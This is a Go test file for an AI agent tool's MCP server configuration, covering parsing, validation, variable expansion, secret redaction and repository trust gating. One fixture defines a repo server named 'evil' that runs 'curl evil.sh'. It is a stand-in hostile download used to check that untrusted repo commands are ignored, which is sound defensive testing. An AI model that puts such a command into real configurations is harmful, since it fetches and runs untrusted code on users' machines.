package config

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestMCPParseAndDefaults(t *testing.T) {
	c := Default()
	if err := yamlInto(c, `
mcp:
  servers:
    docs: {command: "npx", args: ["-y", "@some/mcp-server"], env: {KEY: "${DOCS_KEY}"}}
    db:   {url: "http://localhost:8080/mcp"}
    feed: {url: "http://x/sse", type: sse}
`); err != nil {
		t.Fatal(err)
	}
	if err := c.Validate(); err != nil {
		t.Fatal(err)
	}
	m := c.MCP
	if !m.AllowsTools() || m.Strict || !slices.Equal(m.RoleList(), DefaultMCPRoles) {
		t.Errorf("defaults: %+v", m)
	}
	if got := m.For("worker", "codex"); !slices.Equal(got, []string{"db", "docs"}) {
		t.Errorf("codex worker = %v (sse is claude only)", got)
	}
	if got := m.For("worker", "claude"); !slices.Equal(got, []string{"db", "docs", "feed"}) {
		t.Errorf("claude worker = %v", got)
	}
	if got := m.For("reviewer", "claude"); got != nil {
		t.Errorf("reviewer = %v", got)
	}
	// Clone (YAML round trip) keeps everything.
	if cl := c.Clone(); cl.MCP.Servers["docs"].Env["KEY"] != "${DOCS_KEY}" || cl.MCP.Servers["feed"].Type != "sse" {
		t.Errorf("clone = %+v", cl.MCP)
	}
}

func TestMCPValidate(t *testing.T) {
	for yml, want := range map[string]string{
		`mcp: {servers: {"bad name": {command: x}}}`:             "names may use only",
		`mcp: {servers: {a: {}}}`:                                "needs a command or a url",
		`mcp: {servers: {a: {command: x, url: y}}}`:              "not both",
		`mcp: {servers: {a: {url: y, type: ws}}}`:                "type must be",
		`mcp: {servers: {a: {command: x}}, roles: [x]}`:          "unknown role",
		`mcp: {servers: {a: {command: x, providers: [gemini]}}}`: "unknown provider",
	} {
		c := Default()
		if err := yamlInto(c, yml); err != nil {
			t.Fatal(err)
		}
		if err := c.Validate(); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%s: err = %v, want %q", yml, err, want)
		}
	}
}

func TestMCPExpandEnv(t *testing.T) {
	env := map[string]string{"TOKEN": "t0k", "EMPTY": ""}
	look := func(k string) (string, bool) { v, ok := env[k]; return v, ok }
	s := MCPServer{Command: "${BIN}x", Args: []string{"--t=${TOKEN}", "$TOKEN", "${EMPTY}"}, Env: map[string]string{"A": "${TOKEN}${NOPE}"},
		URL: "", Headers: map[string]string{"H": "Bearer ${TOKEN}"}}
	got, missing := s.Expanded(look)
	if got.Command != "x" || got.Args[0] != "--t=t0k" || got.Args[1] != "$TOKEN" || got.Args[2] != "" || got.Env["A"] != "t0k" || got.Headers["H"] != "Bearer t0k" {
		t.Errorf("expanded = %+v", got)
	}
	if !slices.Equal(missing, []string{"BIN", "NOPE"}) {
		t.Errorf("missing = %v", missing)
	}
	if s.Env["A"] != "${TOKEN}${NOPE}" || s.Args[0] != "--t=${TOKEN}" {
		t.Error("Expanded changed the original")
	}
}

// A repo's MCP servers run commands: they apply only after sy trust, and
// trusted ones merge with the user's servers.
func TestRepoMCPNeedsTrust(t *testing.T) {
	isolateTrust(t)
	root := t.TempDir()
	os.Mkdir(filepath.Join(root, ".git"), 0o755)
	repo := filepath.Join(root, RepoFileName)
	os.WriteFile(repo, []byte(`
mcp:
  servers:
    evil: {command: "curl", args: ["evil.sh"]}
  roles: [worker]
`), 0o644)
	user := Default()
	user.MCP.Servers = map[string]MCPServer{"mine": {Command: "npx"}}
	s := NewStore(user, filepath.Join(t.TempDir(), "user.yaml"))
	info, err := s.ApplyRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	if info.Trusted || !slices.Contains(info.Ignored, "mcp") {
		t.Fatalf("info = %+v", info)
	}
	if c := s.Get(); len(c.MCP.Servers) != 1 || c.MCP.Servers["evil"].Command != "" || len(c.MCP.Roles) != 0 {
		t.Fatalf("untrusted mcp applied: %+v", c.MCP)
	}
	cmds, err := CommandSettings(repo)
	if err != nil || len(cmds) != 1 || !strings.Contains(cmds[0], "evil") {
		t.Fatalf("sy trust shows %q %v", cmds, err)
	}
	if err := Trust(repo); err != nil {
		t.Fatal(err)
	}
	user2 := Default()
	user2.MCP.Servers = map[string]MCPServer{"mine": {Command: "npx"}}
	s2 := NewStore(user2, filepath.Join(t.TempDir(), "user.yaml"))
	if info, _ := s2.ApplyRepo(root); !info.Trusted {
		t.Fatal("not trusted")
	}
	c := s2.Get()
	if !slices.Equal(c.MCP.Names(), []string{"evil", "mine"}) || !slices.Equal(c.MCP.Roles, []string{"worker"}) {
		t.Errorf("trusted repo mcp: %+v", c.MCP)
	}
}

func yamlInto(c *Config, s string) error { return yaml.Unmarshal([]byte(s), c) }

func TestMCPRedacted(t *testing.T) {
	m := MCPCfg{Servers: map[string]MCPServer{
		"a": {Command: "x", Env: map[string]string{"K": "literal", "R": "${TOKEN}"}, Headers: map[string]string{"H": "Bearer abc"}},
		"b": {URL: "https://h/x?token=abc"},
	}}
	r := m.Redacted()
	if r.Servers["a"].Env["K"] != "<hidden>" || r.Servers["a"].Env["R"] != "${TOKEN}" || r.Servers["a"].Headers["H"] != "<hidden>" ||
		r.Servers["b"].URL != "https://h/x?<hidden>" {
		t.Errorf("redacted = %+v", r)
	}
	if m.Servers["a"].Env["K"] != "literal" {
		t.Error("Redacted changed the original")
	}
}
